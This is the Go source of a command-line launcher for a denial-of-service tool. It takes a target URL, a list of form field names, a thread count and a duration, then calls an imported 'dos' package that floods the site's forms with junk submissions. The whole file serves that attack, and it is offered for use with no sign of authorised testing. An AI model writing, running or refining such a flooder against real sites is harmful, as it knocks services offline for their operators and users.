package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net/url"
	"os"
	"strings"

	"github.com/pierelucas/goformdos/dos"
)

var (
	flagFile = flag.String(
		"f",
		"",
		"File containing form names")
	flagURL = flag.String(
		"u",
		"",
		"Target url")
	flagThreads = flag.Int(
		"r",
		0,
		"Define how many routines should running")
	flagTime = flag.Int(
		"t",
		0,
		"Define dos duration (seconds)")
	flagLog = flag.String(
		"l",
		"",
		"logfile")
)

func appendFilelinesToSlice(filename string, ss *[]string, sync chan<- string) {
	f, err := os.Open(filename)
	if err != nil {
		sync <- fmt.Sprintf("error opening file: %s\n", filename)
	}

	defer func() {
		if err = f.Close(); err != nil {
			sync <- fmt.Sprintf("error closing file: %s\n", filename)
		}
	}()

	s := bufio.NewScanner(f)
	var stripped string
	for s.Scan() {
		stripped = strings.Trim(s.Text(), " \r\n") // Strip whitespace, newline and carriage return from string
		*ss = append(*ss, stripped)
	}

	if err = s.Err(); err != nil {
		sync <- fmt.Sprintf("%s\n", err)
	}

	sync <- ""
}

func validateURL(s string, sync chan<- int8) {
	_, err := url.ParseRequestURI(s)
	if err != nil {
		sync <- -1
	}
	sync <- 0
}

func isPath(filepath string) (bool, error) {
	_, err := os.Stat(filepath)
	if err != nil {
		return false, err
	}
	return true, err
}

func init() {
	fmt.Print("\033[H\033[2J") // clear terminal
	flag.Parse()
	if *flagFile == "" || *flagURL == "" || *flagThreads <= 0 || *flagTime <= 0 {
		log.Fatalln("please define arguments or use -h for help")
	}
	if *flagLog != "" {
		b, _ := isPath(*flagLog)
		if b {
			file, err := os.OpenFile(*flagLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				log.Fatalln(err)
			}

			defer file.Close()

			log.SetOutput(file)
		} else {
			log.Fatalf("%s path not exist - unable to open or create file", *flagLog)
		}
	}
}

func main() {

	var formSlice []string

	urlsync := make(chan int8)
	appendsync := make(chan string)

	go appendFilelinesToSlice(*flagFile, &formSlice, appendsync)
	go validateURL(*flagURL, urlsync)

	appenderr := <-appendsync
	urlerr := <-urlsync
	if appenderr != "" {
		log.Fatalln(appenderr)
	}
	if urlerr < 0 {
		log.Fatalf("url is invalid: %s\n", *flagURL)
	}

	var info dos.TargetInf
	info.AddWebaddress(*flagURL)
	for _, element := range formSlice {
		info.AddForm(element, "1234567890AaBb!?-")
	}

	err := dos.Run(*flagThreads, *flagTime, info)
	if err != nil {
		log.Fatalln(err)
	}
}
